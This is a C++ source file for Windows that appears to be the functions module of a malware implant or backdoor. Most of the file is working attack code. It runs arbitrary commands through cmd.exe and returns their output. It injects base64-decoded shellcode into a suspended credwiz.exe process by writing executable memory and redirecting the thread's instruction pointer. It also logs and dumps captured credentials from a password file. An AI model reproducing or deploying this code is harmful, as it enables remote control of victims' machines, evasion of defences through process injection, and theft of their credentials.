#include "pch.h"
#include "Functions.h"
#include <strsafe.h>
#include <sstream>
#include <wincrypt.h>

BOOL GetUser(OUT LPVOID Data, IN DWORD dwData) {

	if (! GetUserNameA((LPSTR)Data, &dwData) ) {
		return FALSE;
	}

	return TRUE;
}



BOOL RunCommand(OUT LPVOID lpData, IN LPSTR Command) {

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;
	HANDLE hStdOUT_RD = NULL;
	HANDLE hStdOUT_WR = NULL;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	CreatePipe(&hStdOUT_RD, &hStdOUT_WR, &sa, 0);

	// Define the handles.
	ZeroMemory(&si, sizeof(STARTUPINFOA));
	si.cb = sizeof(STARTUPINFOA);
	si.hStdError = hStdOUT_WR;
	si.hStdOutput = hStdOUT_WR;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	DWORD dwCommandSize = MAX_PATH;
	LPSTR lpCommand = (LPSTR)VirtualAlloc(NULL, dwCommandSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	StringCbPrintfA(lpCommand, dwCommandSize, "/c %s", Command);

	CreateProcessA("C:\\Windows\\system32\\cmd.exe", lpCommand, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

	CloseHandle(hStdOUT_WR);
	
	VirtualFree((LPVOID)lpCommand, dwCommandSize, MEM_DECOMMIT);

	DWORD dwRead = 0;
	DWORD dwAll = 0;
	char chRBuf[BUFSIZE];

	LPVOID lpTmpBuffer = lpData;

	// There is a problem with readfile when there is nothing to read at all.
	while (TRUE) {
		
		ReadFile(hStdOUT_RD, chRBuf, BUFSIZE, &dwRead, NULL);
		if (dwRead == 0) break;
		lpTmpBuffer = static_cast<char*>(lpData) + dwAll;
		dwAll += dwRead;
		// If data is bigger the expected size stop overflow.
		if (dwAll >= MAX_DATA) break;
		CopyMemory(lpTmpBuffer, chRBuf, dwRead);
		ZeroMemory(&chRBuf, BUFSIZE);
	}

	CloseHandle(hStdOUT_RD);

	return TRUE;

}



VOID InjectShellcode(OUT LPVOID lpOutputData, IN LPVOID lpInputData) {

	DWORD dwB64Size = MAX_DATA;



	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	BOOL bSuccess = CreateProcess(L"C:\\Windows\\System32\\credwiz.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	
	// Allocate space for shellcode.
	LPVOID lpShellcode = VirtualAllocEx(pi.hProcess, NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LPVOID lpTemp = VirtualAlloc(NULL, MAX_DATA, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	
	DWORD dwB64 = 4096;
	CryptStringToBinaryA((LPCSTR)lpInputData, 0, CRYPT_STRING_BASE64, (BYTE*)lpTemp, &dwB64, NULL, NULL);

	SIZE_T dwWritten = 0;
	
	WriteProcessMemory(pi.hProcess, lpShellcode, lpTemp, MAX_DATA, &dwWritten);
	
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;

	GetThreadContext(pi.hThread, &ctx);

	ctx.Rip = (DWORD64)lpShellcode;

	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	VirtualFree(lpTemp, MAX_DATA, MEM_DECOMMIT);

	CopyMemory(lpOutputData, "DONE" ,4);

}


VOID WriteBody(IN LPVOID lpInputData){



	SYSTEMTIME st;
	GetSystemTime(&st);

	HANDLE hFile = NULL;

	LPVOID lpData = VirtualAlloc(NULL, 2048, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	StringCbPrintfA((LPSTR)lpData, 2048, "%02d/%02d/%04d %02d:%02d:%02d | %s\r\n", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond, lpInputData);

	hFile = CreateFileA(PASS_FILE, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Go to the end of th efile to append the data
	DWORD dwPtr = SetFilePointer(hFile, 0, NULL, FILE_END);

	DWORD dwWritten = 0;
	WriteFile(hFile, lpData, strlen((LPCSTR)lpData), &dwWritten, NULL);

	// Clean up
	CloseHandle(hFile);
	VirtualFree(lpData, 2048, MEM_DECOMMIT);


}

VOID DumpCreds(OUT LPVOID lpOutData){

	// Open the file for read only.

	HANDLE hFile = NULL;
	DWORD dwRead = 0;

	hFile = CreateFileA(PASS_FILE, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
	ReadFile(hFile, lpOutData, MAX_DATA, &dwRead, NULL);

	CloseHandle(hFile);
	
	if (dwRead == 0) {
		CopyMemory(lpOutData, "No Creds Found", 15);
	}

}